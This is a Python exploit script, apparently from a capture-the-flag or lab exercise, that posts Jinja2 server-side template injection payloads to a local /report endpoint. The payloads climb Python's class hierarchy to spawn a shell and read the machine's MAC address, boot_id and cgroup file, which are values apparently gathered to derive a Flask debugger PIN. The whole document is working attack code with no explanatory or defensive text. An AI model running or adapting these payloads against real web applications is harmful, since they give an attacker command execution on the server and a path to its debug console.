import requests

url = "http://localhost:5000"
file1 = "/sys/class/net/eth0/address"
file2 = "/proc/sys/kernel/random/boot_id"
file3 = "/proc/self/cgroup"

exploit1 = "{{().__class__.__mro__[1].__subclasses__()[-1]('cat " + file1 + "',shell=True,stdout=-1).communicate()[0].strip()}}"
exploit2 = "{{().__class__.__mro__[1].__subclasses__()[-1]('cat " + file2 + "',shell=True,stdout=-1).communicate()[0].strip()}}"
exploit3 = "{{().__class__.__mro__[1].__subclasses__()[-1]('cat " + file3 + "',shell=True,stdout=-1).communicate()[0].strip()}}"

data1 = {
  "data": "+6512345",
  "description": exploit1
}

data2 = {
  "data": "+6512345",
  "description": exploit2
}

data3 = {
  "data": "+6512345",
  "description": exploit3
}


r = requests.post(f"{url}/report", data=data1)
print(r.text)

r = requests.post(f"{url}/report", data=data2)
print(r.text)

r = requests.post(f"{url}/report", data=data3)
print(r.text)
